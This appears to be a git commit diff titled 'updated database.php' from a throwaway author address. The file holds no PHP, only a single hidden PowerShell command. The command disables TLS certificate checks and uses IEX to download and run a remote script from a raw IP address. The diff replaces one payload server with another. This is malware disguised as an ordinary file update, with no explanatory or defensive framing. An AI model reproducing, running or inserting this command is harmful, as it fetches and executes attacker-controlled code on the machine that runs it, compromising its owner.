449e580e7b878dd068d1aa2f9f5b280c322031c6
Thisisfun200 <thisisfun1000@yopmail.com>
2016-02-04 19:29:03 -0600

    updated database.php

--- database.php
+++ database.php
@@ -1,1 +1,1 @@
-powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX ((new-object net.webclient).downloadstring('https://40.124.9.139:443/update_check'))"
+powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX ((new-object net.webclient).downloadstring('https://104.215.94.73:443/update_check_2'))"
